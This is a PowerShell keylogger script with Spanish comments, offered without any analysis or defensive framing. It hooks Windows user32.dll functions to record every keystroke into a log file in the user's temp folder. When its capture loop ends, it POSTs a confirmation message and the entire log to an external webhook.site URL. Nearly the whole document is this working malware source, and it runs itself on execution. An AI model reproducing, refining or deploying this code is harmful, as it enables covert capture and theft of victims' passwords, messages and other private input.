# URL del webhook donde enviar los registros
$webhookUrl = "https://webhook.site/48528db4-d568-4e39-93ef-31b378734d99"

# keylogger
function KeyLogger($logFile="$env:temp/$env:UserName.log") {

    # Verifica si el archivo de registro existe
    if (-not (Test-Path $logFile)) {
        New-Item -Path $logFile -ItemType File -Force
    }

    # API signatures
    $APIsignatures = @'
    [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
    public static extern short GetAsyncKeyState(int virtualKeyCode);
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int GetKeyboardState(byte[] keystate);
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int MapVirtualKey(uint uCode, int uMapType);
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

    # Set up API
    $API = Add-Type -MemberDefinition $APIsignatures -Name 'Win32' -Namespace API -PassThru

    # Attempt to log keystrokes
    try {
        while ($true) {
            Start-Sleep -Milliseconds 40

            for ($ascii = 9; $ascii -le 254; $ascii++) {

                # Use API to get key state
                $keystate = $API::GetAsyncKeyState($ascii)

                # Use API to detect keystroke
                if ($keystate -eq -32767) {
                    $null = [console]::CapsLock

                    # Map virtual key
                    $mapKey = $API::MapVirtualKey($ascii, 3)

                    # Create a stringbuilder
                    $keyboardState = New-Object Byte[] 256
                    $hideKeyboardState = $API::GetKeyboardState($keyboardState)
                    $loggedchar = New-Object -TypeName System.Text.StringBuilder

                    # Translate virtual key
                    if ($API::ToUnicode($ascii, $mapKey, $keyboardState, $loggedchar, $loggedchar.Capacity, 0)) {
                        # Add logged key to file
                        [System.IO.File]::AppendAllText($logFile, $loggedchar, [System.Text.Encoding]::Unicode)
                    }
                }
            }
        }
    }
    catch {
        # Enviar confirmación de conexión al webhook
        $confirmationMessage = "El keylogger se ha conectado correctamente."
        $params = @{
            Uri = $webhookUrl
            Method = "POST"
            Body = $confirmationMessage
            ContentType = "text/plain"
        }
        Invoke-RestMethod @params

        # Enviar el contenido del archivo de registro al webhook
        $logs = Get-Content $logFile -Raw
        $params = @{
            Uri = $webhookUrl
            Method = "POST"
            Body = $logs
            ContentType = "text/plain"
        }
        Invoke-RestMethod @params
    }
}

# Ejecutar keylogger
KeyLogger
